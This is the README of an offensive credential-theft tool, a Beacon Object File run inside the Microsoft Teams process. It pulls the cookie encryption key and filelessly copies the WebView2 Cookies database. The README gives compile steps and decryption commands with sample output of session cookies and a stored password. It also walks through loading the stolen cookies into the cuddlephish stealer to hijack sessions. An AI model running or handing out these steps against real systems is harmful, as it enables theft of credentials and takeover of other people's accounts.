# teams-cookies-bof
Steal cookies for Teams, while running within the `ms-teams.exe` process.

Based on: [https://blog.randorisec.fr/ms-teams-access-tokens/](https://blog.randorisec.fr/ms-teams-access-tokens/).

This tool is heavily based on the [Cookie-Monster-BOF](https://github.com/KingOfTheNOPs/cookie-monster).

The BOF will extract the Encryption Key, locate the `msedgewebview2.exe` processes with a handle to the Cookies file, copy the handle and then filelessly download the target file.

Once the Cookies are downloaded, the Python decryption script (see below) can be used to extract those secrets.

## BOF Usage

The BOF is supposed to be run within the `ms-teams.exe` Teams process. The BOF takes no arguments.

<img width="934" height="429" alt="poc" src="https://github.com/user-attachments/assets/7c21e100-4c7b-4c1a-8f7e-fff1e34a1e38" />

## Compile BOF 
Ensure Mingw-w64 and make is installed on the Linux prior to compiling.
```
make
```

## Decryption Steps
Install requirements
```
pip3 install -r requirements.txt
```

Usage
```
python3 decrypt.py -h                                                                                                                                                                      
usage: decrypt.py [-h] -k KEY -o {cookies,passwords,cookie-editor,cuddlephish,firefox} -f FILE [--chrome-aes-key CHROME_AES_KEY]

Decrypt Chromium cookies and passwords given a key and DB file

options:
  -h, --help            show this help message and exit
  -k KEY, --key KEY     Decryption key
  -o {cookies,passwords,cookie-editor,cuddlephish,firefox}, --option {cookies,passwords,cookie-editor,cuddlephish,firefox}
                        Option to choose
  -f FILE, --file FILE  Location of the database file
  --chrome-aes-key CHROME_AES_KEY
                        Chrome AES Key
```

Examples:
Decrypt Chrome/Edge Cookies File
```
python .\decrypt.py -k "\xec\xfc...." -o cookies -f ChromeCookies.db

Results Example:
-----------------------------------
Host: .github.com
Path: /
Name: dotcom_user
Cookie: KingOfTheNOPs
Expires: Oct 28 2024 21:25:22

Host: github.com
Path: /
Name: user_session
Cookie: x123.....
Expires: Nov 11 2023 21:25:22
```
Decrypt Chrome Cookies with Chrome AES Key
```
python3 decrypt.py --chrome-aes-key '\x8e\....' -k "\x03\...." -o cuddlephish -f ChromeCookies.db
Cookies saved to cuddlephish_2025-07-03_01-53-57.json
```
Decrypt Chrome/Edge Cookies File and save to json
```
python .\decrypt.py -k "\xec\xfc...." -o cookie-editor -f ChromeCookies.db
Results Example:
Cookies saved to 2025-04-11_18-06-10_cookies.json
```
Import cookies JSON file with https://cookie-editor.com/ 

Decrypt Chome/Edge Passwords File
```
python .\decrypt.py -k "\xec\xfc...." -o passwords ChromePasswords.db

Results Example:
-----------------------------------
URL: https://test.com/
Username: tester
Password: McTesty
```
Decrypt Firefox Cookies and Stored Credentials: <br>
https://github.com/lclevy/firepwd

### CuddlePhish Support
added cuddlephish option to the decrypt script which should support using the cookie with https://github.com/fkasler/cuddlephish

```
# Decrypt Cookies
python3 decrypt.py -k "\xec\xfc..." -o cuddlephish -f ChromeCookies.db

# Clone Project
cd 
git clone https://github.com/fkasler/cuddlephish
cd cuddlephish

# Install Dependencies Example on Debian 
curl -fsSL https://deb.nodesource.com/setup_23.x -o nodesource_setup.sh
sudo -E bash nodesource_setup.sh
sudo apt-get install nodejs
npm install

# Import Cookies
cp ~/cookie-monster/cuddlephish_YYYY-MM-DD_HH-MM-SS.json .
node stealer.js cuddlephish_YYYY-MM-DD_HH-MM-SS.json
```

## References
Stealing Microsoft Teams access tokens in 2025:
https://blog.randorisec.fr/ms-teams-access-tokens/ <br>
Cookie-Monster-BOF:
https://github.com/KingOfTheNOPs/cookie-monster <br>
Cookie Webkit Master Key Extractor:
https://github.com/Mr-Un1k0d3r/Cookie-Graber-BOF <br>
Fileless download:
https://github.com/fortra/nanodump <br>
